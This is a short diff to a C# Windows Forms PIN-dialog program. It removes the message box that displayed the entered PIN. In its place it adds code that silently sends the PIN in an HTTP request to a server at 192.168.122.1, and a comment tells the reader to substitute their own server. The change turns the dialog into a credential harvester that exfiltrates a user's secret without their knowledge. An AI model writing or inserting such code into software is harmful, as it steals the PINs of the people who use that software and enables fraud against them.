@@ -1,5 +1,6 @@
 using System;
 using System.Drawing;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
@@ -18,10 +19,11 @@ namespace PinDialogDemo
                 var result = dlg.ShowDialog();
                 if (result == DialogResult.OK)
                 {
-                    MessageBox.Show($"You entered PIN: {dlg.PIN}",
-                                    "Result",
-                                    MessageBoxButtons.OK,
-                                    MessageBoxIcon.Information);
+                    var pin = dlg.PIN;
+                    // update below line to your server you want
+                    var url = $"http://192.168.122.1?pin={Uri.EscapeDataString(pin)}";
+                    var client = new WebClient();
+                    client.DownloadString(url);
                 }
                 else
                 {
